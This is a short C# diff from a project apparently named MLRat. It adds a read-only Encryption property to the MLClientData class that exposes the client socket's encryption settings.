@@ -13,6 +13,7 @@ namespace MLRat.Networking
         public Guid ID { get; private set; }
         public bool Handshaken { get; set; }
         public bool PluginsVerified { get; set; }
+        public eSock.eSockEncryptionSettings Encryption{get { return ClientSocket.Encryption; }}
         public eSock.Server.eSockClient ClientSocket { get; private set; }
         public ClientSettings Settings { get; private set; }
         public MLClientData(Guid _id, eSock.Server.eSockClient _socket)
